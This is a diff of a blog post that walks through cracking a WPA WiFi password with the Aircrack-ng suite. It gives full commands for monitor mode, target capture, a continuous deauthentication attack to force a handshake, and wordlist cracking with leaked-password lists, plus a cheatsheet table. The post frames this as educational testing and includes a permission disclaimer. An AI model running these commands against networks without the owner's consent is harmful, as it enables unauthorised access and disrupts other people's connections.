@@ -2,99 +2,171 @@
 title: "Cracking Wifi Password with Aircrack-NG"
 description: Educational guide to WiFi security testing using Aircrack-ng suite for monitoring, capturing, and analyzing wireless networks.
 date: 2024-07-06T22:06:14+0800
-lastmod: 2024-12-31T06:24:58+0800
-tag: "WiFi Security, Aircrack-ng, Penetration Testing"
+lastmod: 2026-04-05T02:55:48+0800
+tag: "WiFi Security, Aircrack-NG"
 lang: en-US
 ---
 
 ## Aircrack-ng?
 
-to make a long story short. Aircrack-ng is a network software suite consisting of WiFi security tools that can be used to assess the security of wireless networks. It focuses on different areas of WiFi security, including monitoring, attacking, testing, and cracking.
+To make a long story short, Aircrack-ng is a network software suite consisting of WiFi security tools that can be used to assess the security of wireless networks. It focuses on different areas of WiFi security, including monitoring, attacking, testing, and cracking.
 
 ### Disclaimer
 
 This guide is for educational purposes only. Unauthorized access to wireless networks is illegal and unethical. Always obtain permission from the network owner before attempting to access or test their network security.
 
-Only cracking your own network or network owner allowed you to do this.
+Only crack your own network or a network where the owner has given you explicit permission.
 
-## Step 1: Hardware Requirements
+## Hardware Requirements
 
-To getting started with Aircrack-ng, you'll need a compatible wireless network adapter that supports monitor mode and packet injection.
+To get started with Aircrack-ng, you'll need a compatible wireless network adapter that supports **monitor mode** and **packet injection**.
 
-And also, Use a computer with a GNU/Linux operating system, such as Kali Linux, which comes pre-installed with Aircrack-ng. or you can install by yourself. like this:
+For a list of Aircrack-ng compatible adapters, you can check the ALFA website. ALFA is my highly recommended place to buy Kali-compatible WiFi adapters.
+
+>https://www.alfa.com.tw/collections/kali-linux-compatible?view=all
+
+## Installing Aircrack-NG
+
+You'll also need a computer with a GNU/Linux operating system, such as Kali Linux, which comes pre-installed with Aircrack-ng. Or you can install it yourself:
 
 ```bash
 sudo pacman -S aircrack-ng
 ```
 
->Note: Below action will use sudo previlege all the time. So its better to use root user.
+> Note: The commands below require root privileges. It's recommended to use `sudo` or switch to the root user.
 
-## Step 2: Checking Card Status
+## Testing Speed
 
-First, check if your wireless card supports monitor mode and recognizes the wireless interface:
+You can run this command to test out how many passwords per second Aircrack can try.
+
+```shell
+sudo aircrack-ng -S
+```
+
+## Finding Your Wireless Interface
+
+First, identify your wireless interface name:
+
+```bash
+ip a
+```
+
+Look for your wireless interface, it's usually named something like `wlan0`, `wlo1`, or it may be randomly generated. Verify it using `ifconfig` or `ip a` to ensure it's correct.
+
+## Checking Card Status
+
+Check if your wireless card supports monitor mode and recognizes the wireless interface:
 
 ```shell
 iwconfig
 ```
 ![iwconfig](./iwconfig.gif)
 
-## Step 3: Starting Monitor Mode
+## Starting Monitor Mode
 
-Enable monitor mode on your wireless interface `wlan0` its will disable your network connection.
-
-```shell
-airmon-ng start wlan0
-```
-![airmon-ng start wlan0](./airmon-ng start wlan0.png)
-
-## Step 4: Finding Target WiFi Network
-
-Identify the WiFi network, we will need the following information for the target network and crack it.
-
-- ESSID (network name)
-- BSSID (MAC address of the access point)
-- Channel number
+Enable monitor mode on your wireless interface. This will disable your normal network connection:
 
 ```shell
-airodump-ng wlan0mon
+sudo airmon-ng start <your-interface>
+# sudo airmon-ng start wlan0
 ```
-![airodump-ng wlan0mon](./airodump-ng wlan0mon.gif)
+![airmon-ng start wlan0](./airmon-ng_start_wlan0.png)
 
-## Step 5: Creating Capture File
+After enabling monitor mode, your interface will typically be renamed with a `mon` suffix (e.g., `wlan0mon`).
+
+## Testing Packet Injection
+
+Verify that your adapter supports packet injection:
+
+```shell
+sudo aireplay-ng -9 <your-interface-mon>
+# eg: sudo aireplay-ng -9 wlan0mon
+```
+
+## Finding Target WiFi Network
+
+Identify the WiFi network. You'll need the following information:
+
+- **BSSID** (MAC address of the access point)
+- **Channel** number
+- **ESSID** (network name)
+
+```shell
+sudo airodump-ng <your-interface-mon>
+# eg: sudo airodump-ng wlan0mon
+```
+![airodump-ng wlan0mon](./airodump-ng_wlan0mon.gif)
+
+## Creating Capture File
 
 Capture data from the target network:
 
 ```shell
-airodump-ng -d [BSSID] -c[channel] -w [capture filename] wlan0mon
+sudo airodump-ng -d <BSSID> -c <channel> -w <output> <your-interface-mon>
+# e.g. sudo airodump-ng -d 11:22:33:44:55:66 -c 1 -w home wlan0mon
 ```
 ![Creating Cap file](./capfile.gif)
 ![Creating Cap file-2](./capfile-2.gif)
 ![file](./file.gif)
 
-## Step 6: Performing Deauthentication Attack
+This saves capture files as `<output>-01.cap`, `<output>-02.cap`, etc. Keep this terminal running while you perform the next step.
 
-This will fucking disconnect that wifi network and trying to capture inside the user handshark by they reconnecting to the network. The handshake aor PMKID is necessary to crack the WiFi password. You also can use the handshark and use other tools to crack the password like hashcat.
+## Performing Deauthentication Attack
+
+This will disconnect clients from the WiFi network, forcing them to reconnect, which allows you to capture the WPA handshake (or PMKID). The handshake is necessary to crack the WiFi password. You can also use the captured handshake with other tools like Hashcat.
+
+Open a **new terminal** and run:
 
 ```shell
-aireplay-ng --deauth 0 -a [BSSID] wlan0mon
+sudo aireplay-ng --deauth 0 -a <BSSID> <your-interface-mon>
+# eg: sudo aireplay-ng --deauth 0 -a 11:22:33:44:55:66 wlan0mon
 ```
 ![Device deauth](./handshake.gif)
 
-## Step 7: Cracking the Password
+Watch the first terminal, once you see `WPA handshake: <BSSID>`, you've captured it and can stop both commands.
+
+## Deauthentication Is Not Always Required
+
+Deauthentication is one way to force a client to reconnect in order to capture the handshake. However, you can also simply wait for a legitimate client to connect (or attempt a failed connection) and capture the handshake naturally.
+
+>***Deauthentication essentially acts as a DoS attack against the AP, but it is not strictly required to crack the AP password.***
+
+## Cracking the Password
 
 Once you've captured the handshake or PMKID, use Aircrack-ng to crack the WiFi password:
 
 ```shell
-aircrack-ng [capture filename] -w [password list file]
+sudo aircrack-ng <capture file> -w <wordlist>
+# e.g. sudo aircrack-ng home-01.cap -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt
+# You can use SecLists btw.
 ```
-
 ![Cracking password](./cracking.png)
 
-## Finaly Step: Closing Monitor Mode
+## Closing Monitor Mode
 
-After you've finished testing the network security, stop the monitor mode on your wireless interface, and now your network connection will be back.
+After you've finished testing the network security, stop the monitor mode on your wireless interface. Your normal network connection will be restored:
 
 ```shell
-airmon-ng stop wlan0mon
+sudo airmon-ng stop <your-interface-mon>
+# eg: sudo airmon-ng stop wlan0mon
 ```
+
 ![Stop Monitor Mode](./stop.png)
+
+## By the way
+
+You can simply keep the `.cap` file, that's all you need to crack a WiFi password. You don't need to capture the handshake again. Just keep the `.cap` file. This file can also be shared with others, which makes the cracking process more flexible and can be done offline or anywhere.
+
+## Quick Command Cheatsheet
+
+| Command | Purpose |
+|---------|---------|
+| `ip a` | Find your wireless interface name |
+| `iwconfig` | Check wireless card status |
+| `airmon-ng start wlan0` | Enable monitor mode |
+| `aireplay-ng -9 wlan0mon` | Test packet injection |
+| `airodump-ng wlan0mon` | Scan nearby networks |
+| `airodump-ng -d 11:22:33:44:55:66 -c 1 -w home wlan0mon` | Capture target traffic |
+| `aireplay-ng --deauth 0 -a 11:22:33:44:55:66 wlan0mon` | Force clients to reconnect |
+| `aircrack-ng <cap> -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-05.txt` | Crack captured handshake |
+| `airmon-ng stop wlan0mon` | Disable monitor mode |
